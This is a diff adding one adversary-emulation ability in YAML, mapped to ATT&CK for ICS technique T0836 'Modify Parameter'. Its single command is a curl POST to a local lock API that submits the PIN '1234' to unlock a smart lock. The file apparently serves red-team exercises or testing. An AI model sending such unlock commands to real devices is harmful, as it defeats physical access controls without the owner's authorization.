@@ -1,0 +1,13 @@
+---
+- id: a05bf160-6462-4812-8be9-cfd0093f6de9
+  name: smart unlock
+  description: Unlock the smart lock by submitting the correct PIN
+  tactic: impact
+  technique:
+    attack_id: T0836
+    name: Modify Parameter
+  platforms:
+    linux:
+      native:
+        command: |
+          curl -s -X POST http://localhost:1880/api/lock/unlock -H "Content-Type: application/json" -d '{"pin":"1234"}'
